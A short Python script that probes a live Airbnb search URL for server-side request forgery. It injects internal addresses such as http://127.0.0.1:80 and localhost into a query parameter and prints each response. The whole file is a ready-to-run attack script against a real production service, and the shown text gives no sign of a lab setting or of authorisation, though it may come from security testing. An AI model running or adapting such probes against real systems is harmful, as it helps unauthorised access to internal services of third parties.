import requests
print('Initialising....')

# Define the base URL and parameters
base_url = "https://bg.airbnb.com/s/some-place/homes"
params = {
    "tab_id": "home_tab",
    "refinement_paths[]": "/homes",
    "flexible_trip_lengths[]": "one_week",
    "monthly_start_date": "2024-08-01",
    "monthly_length": "3",
    "monthly_end_date": "2024-11-01",
    "price_filter_input_type": "0",
    "channel": "EXPLORE",
    "date_picker_type": "calendar",
    "checkin": "2024-07-18",
    "checkout": "2024-07-26",
    "search_type": "unknown"
}

# List of SSRF payloads to test. Ennter more endpoints if needed 
ssrf_payloads = [
    "http://127.0.0.1:80",
    "http://localhost:80"    
   ]

# Function to perform the SSRF test
def test_ssrf(payload):
    params["refinement_paths[]"] = payload
    try:
        response = requests.get(base_url, params=params)
        print(f"Testing payload: {payload}")
        print(f"Status Code: {response.status_code}")
        print(f"Response Content: {response.text[:200]}...")  # Print only the first 200 chars for brevity
        print("\n")
    except Exception as e:
        print(f"Failed to send request for payload {payload}: {e}")

# Iterate over each payload and test
for payload in ssrf_payloads:
    test_ssrf(payload)

